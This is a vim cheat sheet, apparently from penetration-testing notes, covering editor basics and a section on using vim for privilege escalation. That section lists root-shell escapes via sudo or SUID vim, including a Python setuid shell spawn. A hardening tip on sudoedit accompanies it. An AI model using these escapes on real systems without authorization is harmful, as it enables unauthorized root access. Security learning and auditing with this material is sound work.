# vim

On every Linux host you will ever land on, often as the *only* editor. You need it to edit a config, fix a payload or read a file on a target with no GUI — and `vim` in `sudo -l` is a root shell, so it's also a privesc primitive.

Modes: **normal** (keys are commands — `Esc` to get here), **insert** (typing), **visual** (selecting), **command** (`:`).

## Essential

### Get in, get out

| Goal | Keys |
| --- | --- |
| Insert mode | `i` before cursor, `a` after, `I` line start, `A` line end |
| Open a new line | `o` below, `O` above |
| Back to normal mode | `Esc` (or `Ctrl-[`) |
| Save | `:w` |
| Save + quit | `:wq` or `:x` or `ZZ` |
| **Quit, discard changes** | `:q!` or `ZQ` |
| Quit (no changes made) | `:q` |
| **Forgot to sudo** | `:w !sudo tee % > /dev/null` then `L` to reload |
| Open another file | `:e path/to/file` |

### Move

| Goal | Keys |
| --- | --- |
| Char / line | `h` `j` `k` `l` |
| Word forward / back | `w` / `b` (`e` = end of word) |
| Line start / end | `0` / `$` (`^` = first non-blank) |
| Top / bottom of file | `gg` / `G` |
| Go to line 42 | `42G` or `:42` |
| Half page up / down | `Ctrl-u` / `Ctrl-d` |
| Jump to char on line | `f<char>` forward, `F<char>` back |
| Matching bracket | `%` |
| Paragraph / block | `{` `}` |

### Edit

| Goal | Keys |
| --- | --- |
| Delete char / line | `x` / `dd` |
| Delete word / to line end | `dw` / `D` |
| Change word / to line end | `cw` / `C` |
| Copy (yank) line / paste | `yy` / `p` below, `P` above |
| **Undo / redo** | `u` / `Ctrl-r` |
| **Repeat last change** | `.` |
| Join line below | `J` |
| Indent / outdent line | `>>` / `<<` |
| Replace single char | `r<char>` |
| **Counts — prefix any of the above** | `5dd` (5 lines), `3yy`, `d3w`, `10j` |

### Search and replace

| Goal | Keys |
| --- | --- |
| Search forward / back | `/text` / `?text` |
| Next / previous match | `n` / `N` |
| Search word under cursor | `*` |
| Clear highlight | `:noh` |
| **Replace in whole file** | `:%s/old/new/g` |
| Replace, confirm each | `:%s/old/new/gc` |
| Replace on this line only | `:s/old/new/g` |
| Replace in a line range | `:1,20s/old/new/g` |

### Visual mode

| Goal | Keys |
| --- | --- |
| Select by char / line | `v` / `V` |
| **Select a column block** | `Ctrl-v` |
| Then: delete / yank / indent | `d` / `y` / `>` |
| **Comment out many lines** | `Ctrl-v`, select rows, `I`, type `#`, `Esc` |
| Reselect last selection | `gv` |

### Splits and buffers

| Goal | Keys |
| --- | --- |
| Split horizontal / vertical | `:sp file` / `:vsp file` |
| Move between splits | `Ctrl-w` then `h` `j` `k` `l` |
| List / next / previous buffer | `:ls` / `:bn` / `:bp` |
| New tab / next tab | `:tabnew` / `gt` |

### The one that will bite you

| Problem | Fix |
| --- | --- |
| **Pasting a payload mangles it** — autoindent cascades the indentation | `:set paste` first, paste, then `:set nopaste` |
| Script fails with `bad interpreter: ^M` after transfer from Windows | `:set ff=unix` then `:w` |
| Can't see tabs vs spaces | `:set list` |

## Occasional — niche, but there's a use case

| Feature | How | Use case |
| --- | --- | --- |
| **Read command output into the file** | `:r !ls -la /etc` | Paste real output into notes or a config without leaving vim |
| **Filter the buffer through a command** | `:%!sort -u`, `:%!jq .` | Dedupe a target list, pretty-print captured JSON |
| Macros | `qa` … actions … `q` to record, `@a` to play, `@@` to repeat | Reformat 500 lines of scan output into a wordlist |
| Run on every matching line | `:g/pattern/d` delete, `:v/pattern/d` keep only matches | Strip noise from a log or scan file |
| Registers | `"ay` yank to `a`, `"ap` paste it | Juggle several snippets at once |
| System clipboard | `"+y` / `"+p` (needs a vim built with `+clipboard`) | Move a payload in or out |
| Marks | `ma` sets mark `a`, `'a` jumps to it | Bounce between two spots in a long config |
| Jump list | `Ctrl-o` back, `Ctrl-i` forward | Undo a navigation mistake |
| **Hex edit** | `:%!xxd` to edit, `:%!xxd -r` to convert back | Patch a binary or fix a magic byte on a host with no tooling |
| Sort / dedupe in place | `:sort`, `:sort u` | Clean a host or credential list |
| Line numbers, syntax | `:set number`, `:syntax on` | Reading code on a target |

## Offensive use — vim as a privesc primitive

If `vim`, `vi`, `rvim` or `view` shows up in `sudo -l`, that's a root shell. See [GTFOBins](https://gtfobins.github.io/gtfobins/vim/) and [Linux — Privilege Escalation](../Linux/Privilege%20Escalation.md).

| Situation | Escape |
| --- | --- |
| `sudo vim` available | `sudo vim -c ':!/bin/sh'` |
| Already inside vim as root | `:!/bin/sh` |
| `:!` seems blocked | `:set shell=/bin/sh` then `:shell` |
| vim built with python | `:py import os; os.execl("/bin/sh","sh","-c","reset; exec sh")` |
| SUID vim | `vim -c ':py import os; os.setuid(0); os.execl("/bin/sh","sh","-c","reset; exec sh")'` |
| Escaping a restricted shell | if the shell lets you run `vim`, `:!/bin/sh` breaks out |

Also useful in the other direction: `:r !cmd` and `:%!cmd` run commands through the editor, which sometimes survives a restricted environment that blocks a direct shell.

**Blue team:** `vim` in a sudoers rule is a misconfiguration, not a convenience — `sudoedit`/`sudo -e` exists for exactly this and does not spawn a shell. Audit `sudo -l` output for any editor, pager (`less`, `more`), or interpreter. See [1. Linux Hardening](../../Defense/System%20and%20Services%20Hardening/1.%20Linux%20Hardening.md).

## Minimal .vimrc

```vim
set number
syntax on
set tabstop=4 shiftwidth=4 expandtab
set ignorecase smartcase      " case-insensitive unless you type a capital
set incsearch hlsearch
set clipboard=unnamedplus     " y/p use the system clipboard
```

Don't rely on it — on a target you get whatever `vi` is there. Learn the defaults.

## Related

[tmux](tmux.md) · [folder README](README.md) · [Linux — Privilege Escalation](../Linux/Privilege%20Escalation.md) · [Linux — Enumeration & Privilege Escalation](../Linux/Enumeration%20%26%20Privilege%20Escalation.md) · [Linux Overview](../Linux/Linux%20Overview.md)
